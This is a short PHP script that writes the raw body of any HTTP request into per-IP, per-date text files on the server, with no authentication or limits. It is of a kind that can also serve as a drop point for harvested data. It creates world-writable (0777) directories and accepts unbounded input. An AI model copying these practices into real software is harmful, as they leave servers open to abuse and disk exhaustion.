 

<?php

$o = fopen("php://input", "r");
$str = stream_get_contents($o);
fclose($o);  

$curDate   = date("d-m-Y");
$ip = $_SERVER['REMOTE_ADDR'] ;
$directory = "logs2/" . $ip . "/" . $curDate;
$myfile   = $directory . "/" . $ip . ".txt"; 
// Create logs dir if it not exists
if (!file_exists($directory)) {
       mkdir($directory, 0777, true);
}  
$myfile = fopen($myfile, "a+") or die("Unable to open file!");
fwrite($myfile, $str);
fclose($myfile);
?>